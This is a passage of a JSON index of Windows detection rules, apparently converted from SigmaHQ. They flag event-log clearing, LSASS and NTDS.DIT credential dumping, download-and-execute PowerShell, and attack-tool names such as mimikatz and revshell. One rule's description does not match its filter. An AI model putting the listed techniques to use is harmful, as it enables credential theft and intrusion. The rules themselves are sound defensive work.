evt.Parsed.ParentProcessId\n\n", "description": "Detects the clearing or configuration tampering of EventLog using utilities such as \"wevtutil\", \"powershell\" and \"wmic\". This technique were seen used by threat actors and ransomware strains in order to evade defenses. \n", "path": "scenarios/sigmahq/proc_creation_win_susp_eventlog_clear.yml", "version": "0.2", "versions": {"0.1": {"digest": "c8605888a8be4dcc7cd5d001fbee0e147450d7353f7df2cb86795002406c3ab5"}, "0.2": {"digest": "ecd9d45a4dc4394e4c268e8ad58cf2241b7639c9b0408fd021c9e275c5843f0a"}}}, "sigmahq/proc_creation_win_susp_execution_from_public_folder_as_parent": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_execution_from_public_folder_as_parent\ndescription: |\n  Detects a potentially suspicious execution of a parent process located in the \"\\Users\\Public\" folder executing a child process containing references to shell or scripting binaries and commandlines. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage contains ':\\\\Users\\\\Public\\\\' && (evt.Parsed.Image endsWith '\\\\bitsadmin.exe' || evt.Parsed.Image endsWith '\\\\certutil.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\mshta.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe' || evt.Parsed.CommandLine contains 'bitsadmin' || evt.Parsed.CommandLine contains 'certutil' || evt.Parsed.CommandLine contains 'cscript' || evt.Parsed.CommandLine contains 'mshta' || evt.Parsed.CommandLine contains 'powershell' || evt.Parsed.CommandLine contains 'regsvr32' || evt.Parsed.CommandLine contains 'rundll32' || evt.Parsed.CommandLine contains 'wscript'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1564\n   - attack.t1059\n\n  label: \"Potentially Suspicious Execution From Parent Process In Public Folder\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a potentially suspicious execution of a parent process located in the \"\\Users\\Public\" folder executing a child process containing references to shell or scripting binaries and commandlines. \n", "path": "scenarios/sigmahq/proc_creation_win_susp_execution_from_public_folder_as_parent.yml", "version": "0.2", "versions": {"0.1": {"digest": "801dd371debbca413615a3d3fbc902dd6a66fd1ed32dc865c55d1d8bbd9e4dbd"}, "0.2": {"digest": "b6669f1d44ef77f4533feacaf3dc33a63bf5663aef80b6229ac17038445472e8"}}}, "sigmahq/proc_creation_win_susp_execution_path": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_execution_path\ndescription: |\n  Detects a potentially suspicious execution from an uncommon folder.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image contains ':\\\\Perflogs\\\\' || evt.Parsed.Image contains ':\\\\Users\\\\All Users\\\\' || evt.Parsed.Image contains ':\\\\Users\\\\Default\\\\' || evt.Parsed.Image contains ':\\\\Users\\\\NetworkService\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\addins\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\debug\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\Fonts\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\Help\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\IME\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\Media\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\repair\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\security\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\System32\\\\Tasks\\\\' || evt.Parsed.Image contains ':\\\\Windows\\\\Tasks\\\\' || evt.Parsed.Image contains '$Recycle.bin' || evt.Parsed.Image contains '\\\\config\\\\systemprofile\\\\' || evt.Parsed.Image contains '\\\\Intel\\\\Logs\\\\' || evt.Parsed.Image contains '\\\\RSA\\\\MachineKeys\\\\') && not (evt.Parsed.Image startsWith 'C:\\\\Users\\\\Public\\\\IBM\\\\ClientSolutions\\\\Start_Programs\\\\' || evt.Parsed.Image startsWith 'C:\\\\Windows\\\\SysWOW64\\\\config\\\\systemprofile\\\\Citrix\\\\UpdaterBinaries\\\\' && evt.Parsed.Image endsWith '\\\\CitrixReceiverUpdater.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n\n  label: \"Process Execution From A Potentially Suspicious Folder\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a potentially suspicious execution from an uncommon folder.\n", "path": "scenarios/sigmahq/proc_creation_win_susp_execution_path.yml", "version": "0.2", "versions": {"0.1": {"digest": "562cd3b45daabf4b7d3d026eeae604b52202f8132a188051304df887697895c6"}, "0.2": {"digest": "2cdbd7071f4d7c0f4f2e69c99f95657b1e9faface2d8bac54f61f43d3a79a4c5"}}}, "sigmahq/proc_creation_win_susp_gather_network_info_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_gather_network_info_execution\ndescription: |\n  Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'gatherNetworkInfo.vbs' && not (evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1615\n   - attack.t1059.005\n\n  label: \"Suspicious Reconnaissance Activity Via GatherNetworkInfo.VBS\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects execution of the built-in script located in \"C:\\Windows\\System32\\gatherNetworkInfo.vbs\". Which can be used to gather information about the target machine\n", "path": "scenarios/sigmahq/proc_creation_win_susp_gather_network_info_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": "96afecb148d1c38b0c19ccaa11e508ea4eeee6b6d7ac673b577ec413877d31c4"}, "0.2": {"digest": "7bb3c9223d2b2904030261376462d326593dc74b543a1d7cd13e486ab8abcf64"}}}, "sigmahq/proc_creation_win_susp_image_missing": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_image_missing\ndescription: |\n  Checks whether the image specified in a process creation event is not a full, absolute path (caused by process ghosting or other unorthodox methods to start a process)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (not (evt.Parsed.Image contains '\\\\') && not (evt.Parsed.Image == '' || evt.Parsed.Image in ['-', ''] || evt.Parsed.Image in ['System', 'Registry', 'MemCompression', 'vmmem'] || evt.Parsed.CommandLine in ['Registry', 'MemCompression', 'vmmem']))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Execution Of Non-Existing File\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Checks whether the image specified in a process creation event is not a full, absolute path (caused by process ghosting or other unorthodox methods to start a process)\n", "path": "scenarios/sigmahq/proc_creation_win_susp_image_missing.yml", "version": "0.2", "versions": {"0.1": {"digest": "1f6cf6918983bd22d2d2030dd983d4b350e116dc6ea977d00c96e64822fc8149"}, "0.2": {"digest": "5c9f6076e69c9cafa545c2b94bc3c1e96123793f159a46e4aa7f3b683b23249e"}}}, "sigmahq/proc_creation_win_susp_inline_base64_mz_header": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_inline_base64_mz_header\ndescription: |\n  Detects encoded base64 MZ header in the commandline\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'TVqQAAMAAAAEAAAA' || evt.Parsed.CommandLine contains 'TVpQAAIAAAAEAA8A' || evt.Parsed.CommandLine contains 'TVqAAAEAAAAEABAA' || evt.Parsed.CommandLine contains 'TVoAAAAAAAAAAAAA' || evt.Parsed.CommandLine contains 'TVpTAQEAAAAEAAAA')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Base64 MZ Header In CommandLine\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects encoded base64 MZ header in the commandline\n", "path": "scenarios/sigmahq/proc_creation_win_susp_inline_base64_mz_header.yml", "version": "0.2", "versions": {"0.1": {"digest": "9e8b801ef6e46741993fdfb938203cf67c29e5c6e7d3d077e4ea4d8de26f382c"}, "0.2": {"digest": "5bc6dd2c38be4bb4a367474610fa6c4720e1eb1c37a6fc2b13ff5bcfb978a023"}}}, "sigmahq/proc_creation_win_susp_inline_win_api_access": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_inline_win_api_access\ndescription: |\n  Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains 'AddSecurityPackage' || evt.Parsed.CommandLine contains 'AdjustTokenPrivileges' || evt.Parsed.CommandLine contains 'Advapi32' || evt.Parsed.CommandLine contains 'CloseHandle' || evt.Parsed.CommandLine contains 'CreateProcessWithToken' || evt.Parsed.CommandLine contains 'CreatePseudoConsole' || evt.Parsed.CommandLine contains 'CreateRemoteThread' || evt.Parsed.CommandLine contains 'CreateThread' || evt.Parsed.CommandLine contains 'CreateUserThread' || evt.Parsed.CommandLine contains 'DangerousGetHandle' || evt.Parsed.CommandLine contains 'DuplicateTokenEx' || evt.Parsed.CommandLine contains 'EnumerateSecurityPackages' || evt.Parsed.CommandLine contains 'FreeHGlobal' || evt.Parsed.CommandLine contains 'FreeLibrary' || evt.Parsed.CommandLine contains 'GetDelegateForFunctionPointer' || evt.Parsed.CommandLine contains 'GetLogonSessionData' || evt.Parsed.CommandLine contains 'GetModuleHandle' || evt.Parsed.CommandLine contains 'GetProcAddress' || evt.Parsed.CommandLine contains 'GetProcessHandle' || evt.Parsed.CommandLine contains 'GetTokenInformation' || evt.Parsed.CommandLine contains 'ImpersonateLoggedOnUser' || evt.Parsed.CommandLine contains 'kernel32' || evt.Parsed.CommandLine contains 'LoadLibrary' || evt.Parsed.CommandLine contains 'memcpy' || evt.Parsed.CommandLine contains 'MiniDumpWriteDump' || evt.Parsed.CommandLine contains 'ntdll' || evt.Parsed.CommandLine contains 'OpenDesktop' || evt.Parsed.CommandLine contains 'OpenProcess' || evt.Parsed.CommandLine contains 'OpenProcessToken' || evt.Parsed.CommandLine contains 'OpenThreadToken' || evt.Parsed.CommandLine contains 'OpenWindowStation' || evt.Parsed.CommandLine contains 'PtrToString' || evt.Parsed.CommandLine contains 'QueueUserApc' || evt.Parsed.CommandLine contains 'ReadProcessMemory' || evt.Parsed.CommandLine contains 'RevertToSelf' || evt.Parsed.CommandLine contains 'RtlCreateUserThread' || evt.Parsed.CommandLine contains 'secur32' || evt.Parsed.CommandLine contains 'SetThreadToken' || evt.Parsed.CommandLine contains 'VirtualAlloc' || evt.Parsed.CommandLine contains 'VirtualFree' || evt.Parsed.CommandLine contains 'VirtualProtect' || evt.Parsed.CommandLine contains 'WaitForSingleObject' || evt.Parsed.CommandLine contains 'WriteInt32' || evt.Parsed.CommandLine contains 'WriteProcessMemory' || evt.Parsed.CommandLine contains 'ZeroFreeGlobalAllocUnicode') && not (evt.Parsed.Image endsWith '\\\\MpCmdRun.exe' && evt.Parsed.CommandLine contains 'GetLoadLibraryWAddress32'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1106\n\n  label: \"Potential WinAPI Calls Via CommandLine\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of WinAPI Functions via the commandline. As seen used by threat actors via the tool winapiexec\n", "path": "scenarios/sigmahq/proc_creation_win_susp_inline_win_api_access.yml", "version": "0.2", "versions": {"0.1": {"digest": "320e2c4c94e2cf8940bdf080fd111d9f1a85e5302741478ec9c6e689ee31e22c"}, "0.2": {"digest": "955149fb25a5756050993eddfd3dfc5d1ba74a95e8fd79aaf0a1e3a19ff2acbf"}}}, "sigmahq/proc_creation_win_susp_lsass_dmp_cli_keywords": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_lsass_dmp_cli_keywords\ndescription: |\n  Detects the presence of the keywords \"lsass\" and \".dmp\" in the commandline, which could indicate a potential attempt to dump or create a dump of the lsass process. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'lsass.dmp' || evt.Parsed.CommandLine contains 'lsass.zip' || evt.Parsed.CommandLine contains 'lsass.rar' || evt.Parsed.CommandLine contains 'Andrew.dmp' || evt.Parsed.CommandLine contains 'Coredump.dmp' || evt.Parsed.CommandLine contains 'NotLSASS.zip' || evt.Parsed.CommandLine contains 'lsass_2' || evt.Parsed.CommandLine contains 'lsassdump' || evt.Parsed.CommandLine contains 'lsassdmp' || evt.Parsed.CommandLine contains 'lsass' && evt.Parsed.CommandLine contains '.dmp' || evt.Parsed.CommandLine contains 'SQLDmpr' && evt.Parsed.CommandLine contains '.mdmp' || evt.Parsed.CommandLine contains 'nanodump' && evt.Parsed.CommandLine contains '.dmp')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.001\n\n  label: \"LSASS Dump Keyword In CommandLine\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the presence of the keywords \"lsass\" and \".dmp\" in the commandline, which could indicate a potential attempt to dump or create a dump of the lsass process. \n", "path": "scenarios/sigmahq/proc_creation_win_susp_lsass_dmp_cli_keywords.yml", "version": "0.2", "versions": {"0.1": {"digest": "e6aead37b3c33771600e79660bf1aef0872424a79c78231ff8932de2a7322dfe"}, "0.2": {"digest": "4bd7adf104cb2da0bd49d1188b9f88d227efb4f6601b3e43aa841f06c8dca680"}}}, "sigmahq/proc_creation_win_susp_non_priv_reg_or_ps": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_non_priv_reg_or_ps\ndescription: |\n  Search for usage of reg or Powershell by non-privileged users to modify service configuration in registry\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains 'reg ' && evt.Parsed.CommandLine contains 'add' || evt.Parsed.CommandLine contains 'powershell' || evt.Parsed.CommandLine contains 'set-itemproperty' || evt.Parsed.CommandLine contains ' sp ' || evt.Parsed.CommandLine contains 'new-itemproperty') && evt.Parsed.IntegrityLevel == 'Medium' && evt.Parsed.CommandLine contains 'ControlSet' && evt.Parsed.CommandLine contains 'Services' && (evt.Parsed.CommandLine contains 'ImagePath' || evt.Parsed.CommandLine contains 'FailureCommand' || evt.Parsed.CommandLine contains 'ServiceDLL'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1112\n\n  label: \"Non-privileged Usage of Reg or Powershell\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Search for usage of reg or Powershell by non-privileged users to modify service configuration in registry\n", "path": "scenarios/sigmahq/proc_creation_win_susp_non_priv_reg_or_ps.yml", "version": "0.2", "versions": {"0.1": {"digest": "be573ed37503a05a802c75300e3b175aee7d2e46dc1609a36930bfb7c807f913"}, "0.2": {"digest": "7c3efeb5b8440e6121eb6dfdcca5603d600084ca08aabc66611096cd97216073"}}}, "sigmahq/proc_creation_win_susp_ntds": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_ntds\ndescription: |\n  Detects suspicious process patterns used in NTDS.DIT exfiltration\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\NTDSDump.exe' || evt.Parsed.Image endsWith '\\\\NTDSDumpEx.exe' || evt.Parsed.CommandLine contains 'ntds.dit' && evt.Parsed.CommandLine contains 'system.hiv' || evt.Parsed.CommandLine contains 'NTDSgrab.ps1' || evt.Parsed.CommandLine contains 'ac i ntds' && evt.Parsed.CommandLine contains 'create full' || evt.Parsed.CommandLine contains '/c copy ' && evt.Parsed.CommandLine contains '\\\\windows\\\\ntds\\\\ntds.dit' || evt.Parsed.CommandLine contains 'activate instance ntds' && evt.Parsed.CommandLine contains 'create full' || evt.Parsed.CommandLine contains 'powershell' && evt.Parsed.CommandLine contains 'ntds.dit' || evt.Parsed.CommandLine contains 'ntds.dit' && (evt.Parsed.ParentImage contains '\\\\apache' || evt.Parsed.ParentImage contains '\\\\tomcat' || evt.Parsed.ParentImage contains '\\\\AppData\\\\' || evt.Parsed.ParentImage contains '\\\\Temp\\\\' || evt.Parsed.ParentImage contains '\\\\Public\\\\' || evt.Parsed.ParentImage contains '\\\\PerfLogs\\\\' || evt.Parsed.Image contains '\\\\apache' || evt.Parsed.Image contains '\\\\tomcat' || evt.Parsed.Image contains '\\\\AppData\\\\' || evt.Parsed.Image contains '\\\\Temp\\\\' || evt.Parsed.Image contains '\\\\Public\\\\' || evt.Parsed.Image contains '\\\\PerfLogs\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1003.003\n\n  label: \"Suspicious Process Patterns NTDS.DIT Exfil\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious process patterns used in NTDS.DIT exfiltration\n", "path": "scenarios/sigmahq/proc_creation_win_susp_ntds.yml", "version": "0.2", "versions": {"0.1": {"digest": "7716110fc51ca85a81dbfd43c3d2ceefab5aef1dc7ada789e6a0e7fc0204787d"}, "0.2": {"digest": "502bfebafa02b929b9bd461167317a41c9bc7358293376055d7152a0076f1cd6"}}}, "sigmahq/proc_creation_win_susp_nteventlogfile_usage": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_nteventlogfile_usage\ndescription: |\n  Detects usage of the WMI class \"Win32_NTEventlogFile\" in a potentially suspicious way (delete, backup, change permissions, etc.) from a PowerShell script\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'Win32_NTEventlogFile' && (evt.Parsed.CommandLine contains '.BackupEventlog(' || evt.Parsed.CommandLine contains '.ChangeSecurityPermissions(' || evt.Parsed.CommandLine contains '.ChangeSecurityPermissionsEx(' || evt.Parsed.CommandLine contains '.ClearEventLog(' || evt.Parsed.CommandLine contains '.Delete(' || evt.Parsed.CommandLine contains '.DeleteEx(' || evt.Parsed.CommandLine contains '.Rename(' || evt.Parsed.CommandLine contains '.TakeOwnerShip(' || evt.Parsed.CommandLine contains '.TakeOwnerShipEx('))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Potentially Suspicious Call To Win32_NTEventlogFile Class\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects usage of the WMI class \"Win32_NTEventlogFile\" in a potentially suspicious way (delete, backup, change permissions, etc.) from a PowerShell script\n", "path": "scenarios/sigmahq/proc_creation_win_susp_nteventlogfile_usage.yml", "version": "0.2", "versions": {"0.1": {"digest": "fd9f7aa29c13bd0cd31a4cb83b1c2736e823ca94aefcf6d7370285e0e58178d6"}, "0.2": {"digest": "5d098501670289783f3185fd36bfbd38f9e3fd0dc256e9e40d46bf41b0f07615"}}}, "sigmahq/proc_creation_win_susp_parents": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_parents\ndescription: |\n  Detects suspicious parent processes that should not have any children or should only have a single possible child program\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\minesweeper.exe' || evt.Parsed.ParentImage endsWith '\\\\winver.exe' || evt.Parsed.ParentImage endsWith '\\\\bitsadmin.exe' || (evt.Parsed.ParentImage endsWith '\\\\csrss.exe' || evt.Parsed.ParentImage endsWith '\\\\certutil.exe' || evt.Parsed.ParentImage endsWith '\\\\eventvwr.exe' || evt.Parsed.ParentImage endsWith '\\\\calc.exe' || evt.Parsed.ParentImage endsWith '\\\\notepad.exe') && not (evt.Parsed.Image endsWith '\\\\WerFault.exe' || evt.Parsed.Image endsWith '\\\\wermgr.exe' || evt.Parsed.Image endsWith '\\\\conhost.exe' || evt.Parsed.Image endsWith '\\\\mmc.exe' || evt.Parsed.Image endsWith '\\\\win32calc.exe' || evt.Parsed.Image endsWith '\\\\notepad.exe' || evt.Parsed.Image == ''))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036\n\n  label: \"Suspicious Process Parents\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious parent processes that should not have any children or should only have a single possible child program\n", "path": "scenarios/sigmahq/proc_creation_win_susp_parents.yml", "version": "0.2", "versions": {"0.1": {"digest": "1757ba27b11bf51596eb2c849de358443b2f5cd188b364a2c996c26eb1a3adc7"}, "0.2": {"digest": "f061fac3a61480db1d1d9efe8d2aa9cd25dd2f775e20c9981f037698661ca187"}}}, "sigmahq/proc_creation_win_susp_powershell_execution_via_dll": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_powershell_execution_via_dll\ndescription: |\n  Detects potential PowerShell execution from a DLL instead of the usual PowerShell process as seen used in PowerShdll. This detection assumes that PowerShell commands are passed via the CommandLine. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\InstallUtil.exe' || evt.Parsed.Image endsWith '\\\\RegAsm.exe' || evt.Parsed.Image endsWith '\\\\RegSvcs.exe' || evt.Parsed.Image endsWith '\\\\regsvr32.exe' || evt.Parsed.Image endsWith '\\\\rundll32.exe' || evt.Parsed.OriginalFileName in ['InstallUtil.exe', 'RegAsm.exe', 'RegSvcs.exe', 'REGSVR32.EXE', 'RUNDLL32.EXE']) && (evt.Parsed.CommandLine contains 'Default.GetString' || evt.Parsed.CommandLine contains 'DownloadString' || evt.Parsed.CommandLine contains 'FromBase64String' || evt.Parsed.CommandLine contains 'ICM ' || evt.Parsed.CommandLine contains 'IEX ' || evt.Parsed.CommandLine contains 'Invoke-Command' || evt.Parsed.CommandLine contains 'Invoke-Expression'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218.011\n\n  label: \"Potential PowerShell Execution Via DLL\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential PowerShell execution from a DLL instead of the usual PowerShell process as seen used in PowerShdll. This detection assumes that PowerShell commands are passed via the CommandLine. \n", "path": "scenarios/sigmahq/proc_creation_win_susp_powershell_execution_via_dll.yml", "version": "0.2", "versions": {"0.1": {"digest": "1cbb43072a750d98017b05d84b033e7295aaa889d232e898077e6726169d15bc"}, "0.2": {"digest": "7d42777a32b4cc05ca39f6c8968d2326f6cec1e82a1b49cacfbe9778b4cba951"}}}, "sigmahq/proc_creation_win_susp_priv_escalation_via_named_pipe": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_priv_escalation_via_named_pipe\ndescription: |\n  Detects a remote file copy attempt to a hidden network share. This may indicate lateral movement or data staging activity.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.OriginalFileName in ['Cmd.Exe', 'PowerShell.EXE']) && evt.Parsed.CommandLine contains 'echo' && evt.Parsed.CommandLine contains '>' && evt.Parsed.CommandLine contains '\\\\\\\\.\\\\pipe\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1021\n\n  label: \"Privilege Escalation via Named Pipe Impersonation\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a remote file copy attempt to a hidden network share. This may indicate lateral movement or data staging activity.\n", "path": "scenarios/sigmahq/proc_creation_win_susp_priv_escalation_via_named_pipe.yml", "version": "0.2", "versions": {"0.1": {"digest": "16db3ab4b13e256a55f9f7630011c8f18e4dab1a6f0bc4b84702d6113d5a9876"}, "0.2": {"digest": "6c325f5c25b794f7e2c3ec5670f3410ac1b291ffde0e75ea15f0bb99d579d861"}}}, "sigmahq/proc_creation_win_susp_progname": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_progname\ndescription: |\n  Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image contains '\\\\CVE-202' || evt.Parsed.Image contains '\\\\CVE202' || evt.Parsed.Image endsWith '\\\\poc.exe' || evt.Parsed.Image endsWith '\\\\artifact.exe' || evt.Parsed.Image endsWith '\\\\artifact64.exe' || evt.Parsed.Image endsWith '\\\\artifact_protected.exe' || evt.Parsed.Image endsWith '\\\\artifact32.exe' || evt.Parsed.Image endsWith '\\\\artifact32big.exe' || evt.Parsed.Image endsWith 'obfuscated.exe' || evt.Parsed.Image endsWith 'obfusc.exe' || evt.Parsed.Image endsWith '\\\\meterpreter' || evt.Parsed.CommandLine contains 'inject.ps1' || evt.Parsed.CommandLine contains 'Invoke-CVE' || evt.Parsed.CommandLine contains 'pupy.ps1' || evt.Parsed.CommandLine contains 'payload.ps1' || evt.Parsed.CommandLine contains 'beacon.ps1' || evt.Parsed.CommandLine contains 'PowerView.ps1' || evt.Parsed.CommandLine contains 'bypass.ps1' || evt.Parsed.CommandLine contains 'obfuscated.ps1' || evt.Parsed.CommandLine contains 'obfusc.ps1' || evt.Parsed.CommandLine contains 'obfus.ps1' || evt.Parsed.CommandLine contains 'obfs.ps1' || evt.Parsed.CommandLine contains 'evil.ps1' || evt.Parsed.CommandLine contains 'MiniDogz.ps1' || evt.Parsed.CommandLine contains '_enc.ps1' || evt.Parsed.CommandLine contains '\\\\shell.ps1' || evt.Parsed.CommandLine contains '\\\\rshell.ps1' || evt.Parsed.CommandLine contains 'revshell.ps1' || evt.Parsed.CommandLine contains '\\\\av.ps1' || evt.Parsed.CommandLine contains '\\\\av_test.ps1' || evt.Parsed.CommandLine contains 'adrecon.ps1' || evt.Parsed.CommandLine contains 'mimikatz.ps1' || evt.Parsed.CommandLine contains '\\\\PowerUp_' || evt.Parsed.CommandLine contains 'powerup.ps1' || evt.Parsed.CommandLine contains '\\\\Temp\\\\a.ps1' || evt.Parsed.CommandLine contains '\\\\Temp\\\\p.ps1' || evt.Parsed.CommandLine contains '\\\\Temp\\\\1.ps1' || evt.Parsed.CommandLine contains 'Hound.ps1' || evt.Parsed.CommandLine contains 'encode.ps1' || evt.Parsed.CommandLine contains 'powercat.ps1')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059\n\n  label: \"Suspicious Program Names\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools\n", "path": "scenarios/sigmahq/proc_creation_win_susp_progname.yml", "version": "0.2", "versions": {"0.1": {"digest": "196024d202aa763b08ef7157503810788aa057468be375432d94b95dc2e96c1c"}, "0.2": {"digest": "5bf46a66b560d0237cce5d6b66f191cc6f2820b1e26c04057dcaae9da019dcc6"}}}, "sigmahq/proc_creation_win_susp_recycle_bin_fake_execution": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_recycle_bin_fake_execution\ndescription: |\n  Detects process execution from a fake recycle bin folder, often used to avoid security solution.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image contains 'RECYCLERS.BIN\\\\' || evt.Parsed.Image contains 'RECYCLER.BIN\\\\')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Suspicious Process Execution From Fake Recycle.Bin Folder\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects process execution from a fake recycle bin folder, often used to avoid security solution.\n", "path": "scenarios/sigmahq/proc_creation_win_susp_recycle_bin_fake_execution.yml", "version": "0.2", "versions": {"0.1": {"digest": 